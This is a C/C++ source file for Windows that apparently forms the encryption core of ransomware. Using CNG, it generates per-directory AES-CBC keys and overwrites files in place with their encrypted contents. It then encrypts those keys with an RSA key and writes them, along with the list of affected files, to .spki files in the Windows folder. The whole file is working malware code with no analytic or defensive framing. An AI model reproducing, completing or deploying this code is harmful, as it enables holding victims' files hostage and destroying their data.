#include "crypt.h"
#include "tools.h"

void print_byte(PBYTE data, DWORD size) {
	for (DWORD i = 0; i < size; ++i) {
		printf("0x%02x, ", data[i]);
		if ((i + 1) % 10 == 0) putchar('\n');
	}
}
void print_error(const char* e, NTSTATUS x) {
	printf("Error! %s with code: 0x%x\n", e, x);
	switch (x) {
	case NTE_BAD_FLAGS:
		printf("NTE_BAD_FLAGS\n");
		break;
	case NTE_INVALID_HANDLE:
		printf("NTE_INVALID_HANDLE\n");
		break;
	case NTE_INVALID_PARAMETER:
		printf("NTE_INVALID_PARAMETER\n");
		break;
	case NTE_NO_MEMORY:
		printf("NTE_NO_MEMORY\n");
		break;
	case NTE_NOT_SUPPORTED:
		printf("NTE_NOT_SUPPORTED\n");
		break;
	case NTE_BAD_KEY_STATE:
		printf("NTE_BAD_KEY_STATE\n");
		break;
	case NTE_BAD_TYPE:
		printf("NTE_BAD_TYPE\n");
		break;
	default:
		printf("Unknown Error.\n");
	}
}

bool generate_asymmetric_key(NCRYPT_PROV_HANDLE * handle, NCRYPT_KEY_HANDLE * key, LPCWSTR name) {
	NTSTATUS status;
	if (!NT_SUCCESS(status = NCryptOpenStorageProvider(handle, NULL, 0))) {
		print_error("NCryptOpenStorageProvider failed", status);
		goto end;
	}
	if (!NT_SUCCESS(status = NCryptCreatePersistedKey(*handle, key, L"RSA", NULL, 0, 0))) {
		print_error("NCryptCreatePersistedKey failed", status);
		goto end;
	}
	if (!NT_SUCCESS(status = NCryptFinalizeKey(*key, NCRYPT_SILENT_FLAG))) {
		print_error("NCryptFinalizeKey failed", status);
		goto end;
	}
	goto done;
end:
	if (handle) NCryptFreeObject(*handle);
	if (key) NCryptDeleteKey(*key, NCRYPT_SILENT_FLAG);
	return false;
done:
	return true;
}
bool export_key(NCRYPT_KEY_HANDLE * key, LPVOID buff, DWORD * buffsize, LPCWSTR type) {
	NTSTATUS status;
	HANDLE file = 0;
	DWORD flg = NCRYPT_ALLOW_EXPORT_FLAG | NCRYPT_ALLOW_PLAINTEXT_EXPORT_FLAG;
	DWORD res;

	if (!NT_SUCCESS(status = NCryptSetProperty(*key, NCRYPT_EXPORT_POLICY_PROPERTY, (PBYTE)& flg, sizeof(flg), 0))) {
		print_error("NCryptSetProperty failed", status);
		return false;
	}
	if (!NT_SUCCESS(status = NCryptExportKey(*key, NULL, type, NULL, NULL, 0, &res, 0))) {
		print_error("NCryptExportKey1 failed", status);
		return false;
	}
	if (*buffsize < res) {
		*buffsize = res;
		return true;
	}
	if (!NT_SUCCESS(status = NCryptExportKey(*key, NULL, type, NULL, (PBYTE)buff, res, &res, 0))) {
		print_error("NCryptExportKey2 failed", status);
		return false;
	}
	return true;
}
bool generate_symmetric_key(BCRYPT_ALG_HANDLE *alg_handle, BCRYPT_KEY_HANDLE *key_handle, LPVOID key_buff, DWORD* buff_size, LPVOID iv, DWORD* iv_size) {
	
	if (alg_handle) BCryptCloseAlgorithmProvider(alg_handle, 0);
	if (key_handle) BCryptDestroyKey(key_handle);

	NTSTATUS status = STATUS_UNSUCCESSFUL;
	DWORD block_len = 0, data = 0, key_object = 0, key_size = 0;
	PBYTE pkey_object = 0;
	BYTE rgb_IV[16];
	BYTE rgb_aes128_key[16];

	unsigned int random = 0;


	for (int i = 0; i < 16; ++i) {
		rand_s(&random);
		rgb_IV[i] = (BYTE)(random / 16);
	}
	for (int i = 0; i < 16; ++i) {
		rand_s(&random);
		rgb_aes128_key[i] = (BYTE)(random / 16);
	}
	//open algorithm handle
	if (!NT_SUCCESS(status = BCryptOpenAlgorithmProvider(alg_handle, BCRYPT_AES_ALGORITHM, NULL, 0))) {
		print_error("BCryptOpenAlgorithmProvider failed", status);
		goto end;
	}
	//calculate the size to hold key_object
	if (!NT_SUCCESS(status = BCryptGetProperty(*alg_handle, BCRYPT_BLOCK_LENGTH, (PBYTE)&block_len, sizeof(DWORD), &data, 0))) {
		print_error("BCryptGetProperty failed", status);
		goto end;
	}
	if (block_len > sizeof(rgb_IV)) {
		printf("block length is longer than IV length\n");
		goto end;
	}
	if (!NT_SUCCESS(status = BCryptGetProperty(*alg_handle, BCRYPT_OBJECT_LENGTH, (PBYTE)& key_object, sizeof(DWORD), &data, 0))) {
		print_error("BCryptGetProperty failed", status);
		goto end;
	}
	pkey_object = (PBYTE)HeapAlloc(GetProcessHeap(), 0, key_object);
	if (pkey_object == NULL) {
		printf("pkey_object memory allocation failed.\n");
		goto end;
	}
	if (!NT_SUCCESS(status = BCryptSetProperty(*alg_handle, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0))) {
		print_error("BCryptSetProperty failed", status);
		goto end;
	}
	//generate the key
	if (!NT_SUCCESS(BCryptGenerateSymmetricKey(*alg_handle, key_handle, pkey_object, key_object, (PBYTE)rgb_aes128_key, sizeof(rgb_aes128_key), 0))) {
		print_error("BCryptGenerateSymmetricKey failed", status);
		goto end;
	}
	//save the key
	if (!NT_SUCCESS(status = BCryptExportKey(*key_handle, NULL, BCRYPT_OPAQUE_KEY_BLOB, NULL, 0, &key_size, 0))) {
		print_error("BCryptExportKey failed", status);
		goto end;
	}
	//alocate buffer to hold BLOB
	if (key_size > *buff_size) {
		*buff_size = key_size;
		*iv_size = block_len;
		if (*alg_handle) BCryptCloseAlgorithmProvider(alg_handle, 0);
		if (*key_handle) BCryptDestroyKey(key_handle);
		if (pkey_object) HeapFree(GetProcessHeap(), 0, pkey_object);
		return true;
	}

	memcpy(iv, rgb_IV, block_len);

	if (!NT_SUCCESS(status = BCryptExportKey(*key_handle, NULL, BCRYPT_OPAQUE_KEY_BLOB, (PBYTE)key_buff, key_size, &key_size, 0))) {
		print_error("BCryptExportKey2 failed", status);
		goto end;
	}
	return true;
end:
	if (*alg_handle) BCryptCloseAlgorithmProvider(alg_handle, 0);
	if (*key_handle) BCryptDestroyKey(key_handle);
	if (pkey_object) HeapFree(GetProcessHeap(), 0, pkey_object);
	return false;
}
bool import_asymmetric_key(NCRYPT_PROV_HANDLE *handle, NCRYPT_KEY_HANDLE *key, DWORD buffer_size, LPVOID buffer, LPCWSTR type) {
	HANDLE file;
	DWORD file_size, ret;
	LPVOID buff;
	NTSTATUS status;

	if (*handle) NCryptFreeObject(*handle);
	if (*key) NCryptDeleteKey(*key, NCRYPT_SILENT_FLAG);

	if (buffer == NULL || buffer_size == 0) {
		file = CreateFile("key.txt", GENERIC_READ | GENERIC_WRITE, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		if (file == NULL) {
			printf("key.txt failed to open.\n");
			return false;
		}
		file_size = GetFileSize(file, 0);
		buff = HeapAlloc(GetProcessHeap(), 0, file_size);
		if (buff == 0) {
			printf("buff memory allocation failed.\n");
			return false;
		}
		if (ReadFile(file, buff, file_size, &ret, NULL) == 0) {
			printf("readfile failed with code: %lu\n", GetLastError());
			return false;
		}
	}
	else {
		buff = buffer;
		ret = buffer_size;
	}
	if (!NT_SUCCESS(status = NCryptOpenStorageProvider(handle, NULL, 0))) {
		print_error("NCryptOpenStorageProvider", status);
		return false;
	}
	if (memcmp(type, BCRYPT_RSAPUBLIC_BLOB, wcslen(type)) == 0) {
		if (!NT_SUCCESS(status = NCryptImportKey(*handle, NULL, BCRYPT_RSAPUBLIC_BLOB, NULL, key, (PBYTE)buff, ret, NCRYPT_SILENT_FLAG))) {
			print_error("NCryptImportKey failed", status);
			return false;
		}
	}
	else if (memcmp(type, BCRYPT_RSAFULLPRIVATE_BLOB, wcslen(type)) == 0) {
		if (!NT_SUCCESS(status = NCryptImportKey(*handle, NULL, BCRYPT_RSAFULLPRIVATE_BLOB, NULL, key, (PBYTE)buff, ret, NCRYPT_SILENT_FLAG))) {
			print_error("NCryptImportKey failed", status);
			return false;
		}
	}
	else return false;
	return true;
}
bool encrypt_files(pFileLinkedList file_tail, pAES_KEY_DIR &key_head) {
	NTSTATUS status;
	char file_path[MAX_PATH] = { 0 };
	int j = 0;
	LPVOID aes_key = 0, aes_iv = 0, read_file = 0, write_file = 0, aes_civ = 0;
	DWORD aes_key_size = 0, aes_iv_size = 0, file_size = 0, ret = 0, file_path_len = 0, tfile_path_len = 0, TMP = 0, TMP2 = 0;
	HANDLE file = 0;
	BCRYPT_ALG_HANDLE alg_handle = 0;
	BCRYPT_KEY_HANDLE key_handle = 0;
	pAES_KEY_DIR tmp;
	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION pi = { 0 };

	for (pFileLinkedList t = file_tail; t != NULL; t = t->pre) {
		for (j = strlen(t->file_path); j >= 0; --j) {
			if (t->file_path[j] == '\\') {
				break;
			}
		}
		
		tfile_path_len = strlen(t->file_path) - strlen(&t->file_path[j]) + 1;
		file_path_len = strlen(file_path);

		if ((memcmp(file_path, t->file_path, tfile_path_len < file_path_len ? tfile_path_len : file_path_len) == 0) && (tfile_path_len == file_path_len) && strlen(file_path) != 0) goto jamp;
		//generate new AES key.
		
		if (aes_key) HeapFree(GetProcessHeap(), 0, aes_key);
		if (aes_iv) HeapFree(GetProcessHeap(), 0, aes_iv);
		if (aes_civ) HeapFree(GetProcessHeap(), 0, aes_civ);
		aes_key_size = 0;
		aes_iv_size = 0;
		aes_key = 0;
		aes_iv = 0;
		if (alg_handle) BCryptCloseAlgorithmProvider(alg_handle, 0);
		if (key_handle) BCryptDestroyKey(key_handle);
		alg_handle = 0;
		key_handle = 0;

		if (generate_symmetric_key(&alg_handle, &key_handle, aes_key, &aes_key_size, aes_iv, &aes_iv_size) == false) {
			printf("generate_symmetric_key1 failed.\n");
			return false;
		}
		aes_key = HeapAlloc(GetProcessHeap(), 0, aes_key_size);
		aes_iv = HeapAlloc(GetProcessHeap(), 0, aes_iv_size);
		aes_civ = HeapAlloc(GetProcessHeap(), 0, aes_iv_size);

		if ((aes_key == NULL) || (aes_iv == NULL) || (aes_civ == NULL)) {
			printf("failed to allocate symmetric key buffers.\n");
			return false;
		}
		if (generate_symmetric_key(&alg_handle, &key_handle, aes_key, &aes_key_size, aes_iv, &aes_iv_size) == false) {
			printf("generate_symmetric_key2 failed.\n");
			return false;
		}
		tmp = new AES_KEY_DIR;
		if (tmp == NULL) {
			printf("failed to allocate AES_KEY_DIR.\n");
			return false;
		}
		memcpy(aes_civ, aes_iv, aes_iv_size);
		memset(tmp, 0, sizeof(AES_KEY_DIR));
		memcpy(tmp->aes, aes_key, aes_key_size);
		memcpy(tmp->iv, aes_iv, aes_iv_size);
		memcpy(tmp->civ, aes_iv, aes_iv_size);
		memcpy(tmp->file_path, t->file_path, strlen(t->file_path) - strlen(&t->file_path[j]) + 1);
		tmp->block_len = aes_iv_size;
		tmp->aes_length = aes_key_size;
		if (key_head == NULL) {
			tmp->next = NULL;
			key_head = tmp;
		}
		else {
			tmp->next = key_head;
			key_head = tmp;
		}
		//copy new t->file_path (only the directory, not the file) to file_path
		memset(file_path, 0, MAX_PATH);
		memcpy(file_path, t->file_path, strlen(t->file_path) - strlen(&t->file_path[j]) + 1);
	jamp:
		//if the same directory, encrypt the files and save the info(directory location and its key) into file. IT SHOULD BE ENCRYPTED!
		file = CreateFile(t->file_path, GENERIC_READ | GENERIC_WRITE, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		if (file == INVALID_HANDLE_VALUE) {
			printf("CreateFile failed. %lu\n", GetLastError());
			continue;
		}
		file_size = GetFileSize(file, 0);
		read_file = HeapAlloc(GetProcessHeap(), 0, file_size);
		if (read_file == NULL) {
			printf("read_file heap allocation failed %lu.\n", GetLastError());
			continue;
		}
		if (ReadFile(file, read_file, file_size, &ret, NULL) == false) {
			printf("ReadFile failed %lu\n.", GetLastError());
			goto cn;
		}
		memcpy(aes_iv, aes_civ, aes_iv_size);
		if (!NT_SUCCESS(status = BCryptEncrypt(key_handle, (PBYTE)read_file, file_size, NULL, (PBYTE)aes_iv, aes_iv_size, NULL, NULL, &ret, BCRYPT_BLOCK_PADDING))) {
			print_error("BCryptEncrypt failed", status);
			HeapFree(GetProcessHeap(), 0, read_file);
			continue;
		}
		write_file = HeapAlloc(GetProcessHeap(), 0, ret);
		if (write_file == NULL) {
			printf("write_file heap allocation failed.\n");
			continue;
		}
		if (!NT_SUCCESS(status = BCryptEncrypt(key_handle, (PBYTE)read_file, file_size, NULL, (PBYTE)aes_iv, aes_iv_size, (PBYTE)write_file, ret, &ret, BCRYPT_BLOCK_PADDING))) {
			print_error("BCryptEncrypt2 failed", status);
			goto cn;
		}
		CloseHandle(file);
		file = CreateFile(t->file_path, GENERIC_READ | GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		if (file == NULL) {
			printf("CreateFile failed.\n");
			goto cn;
		}
		if (WriteFile(file, write_file, ret, &ret, NULL) == false) {
			printf("failed to write to file %lu\n", GetLastError());
			goto cn;
		}
	cn:
		HeapFree(GetProcessHeap(), 0, read_file);
		HeapFree(GetProcessHeap(), 0, write_file);
		CloseHandle(file);
		file = NULL;
	}
	return true;
}
bool save_config(pAES_KEY_DIR key_head, pFileLinkedList file_tail, NCRYPT_KEY_HANDLE& key) {
	NTSTATUS status;
	HANDLE file = 0;
	DWORD key_write_size, do_more, ret;
	LPVOID tmp = 0, write_file = 0;
	char location[MAX_PATH];

	SHGetFolderPath(NULL, CSIDL_WINDOWS, NULL, SHGFP_TYPE_CURRENT, location);

	_snprintf(location, strlen(location) +10, "%s\\333.spki", location);

	printf("location3: %s\n", location);

	file = CreateFile(location, GENERIC_READ | GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (file == INVALID_HANDLE_VALUE) {
		printf("failed to create 333.spki %lu - %s\n", GetLastError(), location);
		return false;
	}
	tmp = HeapAlloc(GetProcessHeap(), 0, 100);
	if (tmp == NULL) {
		printf("Failed to allocate tmp.\n");
		return false;
	}
	pAES_KEY_DIR t1;
	for (pAES_KEY_DIR t = key_head; t != NULL;) {
		key_write_size = sizeof(AES_KEY_DIR);
		do_more = 0;
		while (1) {
			if (key_write_size > 100) {
				memcpy(tmp, LPVOID((DWORD)t + do_more * 100), 100);
				++do_more;
			}
			else {
				memset(tmp, 0, 100);
				memcpy(tmp, LPVOID((DWORD)t + do_more * 100), key_write_size);
				do_more = 0;
			}
			if (!NT_SUCCESS(status = NCryptEncrypt(key, (PBYTE)tmp, key_write_size > 100 ? 100 : key_write_size, NULL, NULL, NULL, &ret, NCRYPT_PAD_PKCS1_FLAG))) {
				print_error("NCryptEncrypt1 failed", status);
				return false;
			}
			write_file = HeapAlloc(GetProcessHeap(), 0, ret);
			if (!NT_SUCCESS(status = NCryptEncrypt(key, (PBYTE)tmp, key_write_size > 100 ? 100 : key_write_size, NULL, (PBYTE)write_file, ret, &ret, NCRYPT_PAD_PKCS1_FLAG))) {
				print_error("NCryptEncrypt2 failed", status);
				return false;
			}
			if (WriteFile(file, write_file, ret, &ret, NULL) == NULL) {
				printf("failed to write key to file %lu.\n", GetLastError());
				return false;
			}
			HeapFree(GetProcessHeap(), 0, write_file);
			if (do_more == 0) break;
			key_write_size -= 100;
		}
		t1 = t;
		t = t->next;
		memset(t1, 0, sizeof(AES_KEY_DIR));
		delete t1;
	}
	CloseHandle(file);
	memset(tmp, 0, 100);
	memset(location, 0, MAX_PATH);
	HeapFree(GetProcessHeap(), 0, tmp);

	SHGetFolderPath(NULL, CSIDL_WINDOWS, NULL, SHGFP_TYPE_CURRENT, location);

	_snprintf(location, strlen(location) + 12, "%s\\55555.spki", location);
	printf("location5: %s\n", location);

	file = CreateFile(location, GENERIC_READ | GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (file == INVALID_HANDLE_VALUE) {
		printf("failed to create 55555.spki %lu - %s\n", GetLastError(), location);
		return false;
	}
	pFileLinkedList t2;
	for (pFileLinkedList t = file_tail; t != NULL;) {
		if (!WriteFile(file, t, sizeof(FileLinkedList), &ret, NULL)) {
			printf("WriteFile failed %lu\n", GetLastError());
			return false;
		}
		t2 = t;
		t = t->pre;
		delete t2;
	}

	file_tail = NULL;
	CloseHandle(file);

	return true;
}